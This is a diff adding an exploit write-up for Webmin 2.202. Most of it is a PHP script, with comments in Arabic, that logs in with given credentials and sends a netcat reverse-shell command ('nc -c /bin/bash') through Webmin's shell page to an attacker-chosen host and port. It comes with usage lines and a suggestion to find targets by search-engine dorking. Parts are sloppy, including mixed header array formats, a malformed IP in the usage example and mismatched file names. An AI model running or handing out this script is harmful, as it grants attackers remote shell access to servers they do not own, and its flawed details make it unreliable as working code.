@@ -1,0 +1,127 @@
+=============================================================================================================================================
+| # Title     : Webmin 2.202 Reverse Shell attack                                                                                           |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 10 Fr(Pro) / browser : Mozilla firefox 136.0.0 (64 bits)                                                            |
+| # Vendor    : https://webmin.com/                                                                                                         |
+=============================================================================================================================================
+
+POC :
+
+[+] Dorking İn Google Or Other Search Enggine.
+
+[+] Code Description: This script is an exploit of the vulnerability and aims to perform a Reverse Shell attack, where a command is sent to the server to call nc (Netcat)
+
+    on the targeted server to establish a reverse connection with the attacker.
+
+   (Related : https://packetstorm.news/files/id/189576/ Linked CVE numbers:  ) .
+	
+[+] save code as poc.php.
+
+[+] Usage = line 84 add information & C:\www>php 2.php 127.0.0.1 21 user pass 127.0.00.2 4444
+
+[+] PayLoad :
+
+<?php
+
+// استيراد المكتبات
+function exploit($rhost, $rport, $username, $password, $lhost, $lport) {
+    // إعداد روابط الدخول والأوامر
+    $login_url = "https://$rhost:$rport/session_login.cgi";
+    $command_url = "https://$rhost:$rport/shell/index.cgi";
+
+    // بيانات تسجيل الدخول
+    $login_data = array(
+        "user" => $username,
+        "pass" => $password
+    );
+
+    // إعداد الرؤوس الخاصة بالطلب
+    $headers = array(
+        "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:134.0) Gecko/20100101 Firefox/134.0",
+        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3",
+        "Referer" => "https://$rhost:$rport/session_login.cgi?logout=1",
+        "Origin" => "https://$rhost:$rport",
+        "Connection" => "keep-alive",
+        "Upgrade-Insecure-Requests" => "1",
+        "Cookie" => "redirect=1; testing=1; sid=x"
+    );
+
+    // إعداد الجلسة
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // تعطيل التحقق من الشهادات
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false); // عدم التوجيه التلقائي
+
+    // محاولة تسجيل الدخول
+    echo "Attempting to log in...\n";
+    curl_setopt($ch, CURLOPT_URL, $login_url);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($login_data));
+    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+    $response = curl_exec($ch);
+
+    if (curl_getinfo($ch, CURLINFO_HTTP_CODE) == 302) {
+        // الحصول على SID من الاستجابة
+        preg_match('/Set-Cookie:.*?sid=([^;]*)/', $response, $matches);
+        if (isset($matches[1])) {
+            $sid = $matches[1];
+            echo "Login successful!\n";
+
+            // تحديث ملف تعريف الارتباط بالـ SID
+            $headers["Cookie"] = "redirect=1; testing=1; sid=$sid";
+
+            // تجهيز الحمولة للأمر
+            echo "Check your listener on $lhost:$lport\n";
+            $boundary = "---------------------------30454280098212925122759899223";
+            $payload = "nc -c /bin/bash $lhost $lport";
+            $command_data = "--$boundary\r\n" .
+                            "Content-Disposition: form-data; name=\"cmd\"\r\n\r\n$payload\r\n" .
+                            "--$boundary\r\n" .
+                            "Content-Disposition: form-data; name=\"pwd\"\r\n\r\n/root\r\n" .
+                            "--$boundary\r\n" .
+                            "Content-Disposition: form-data; name=\"history\"\r\n\r\n\r\n" .
+                            "--$boundary--\r\n";
+
+            // إرسال الأمر
+            curl_setopt($ch, CURLOPT_URL, $command_url);
+            curl_setopt($ch, CURLOPT_POSTFIELDS, $command_data);
+            curl_setopt($ch, CURLOPT_HTTPHEADER, array_merge($headers, ["Content-Type: multipart/form-data; boundary=$boundary"]));
+            $command_response = curl_exec($ch);
+
+            echo "[+] Exploited successfully\n";
+            exit(0);
+        } else {
+            echo "Login failed: SID not found.\n";
+            exit(1);
+        }
+    } else {
+        echo "Login failed.\n";
+        exit(1);
+    }
+
+    curl_close($ch);
+}
+
+// قراءة المدخلات من سطر الأوامر
+if ($argc < 7) {
+    echo "Usage: php script.php <rhost> <rport> <username> <password> <lhost> <lport>\n";
+    exit(1);
+}
+
+$rhost = $argv[1];
+$rport = $argv[2];
+$username = $argv[3];
+$password = $argv[4];
+$lhost = $argv[5];
+$lport = $argv[6];
+
+// تنفيذ الاستغلال
+exploit($rhost, $rport, $username, $password, $lhost, $lport);
+
+?>
+
+
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
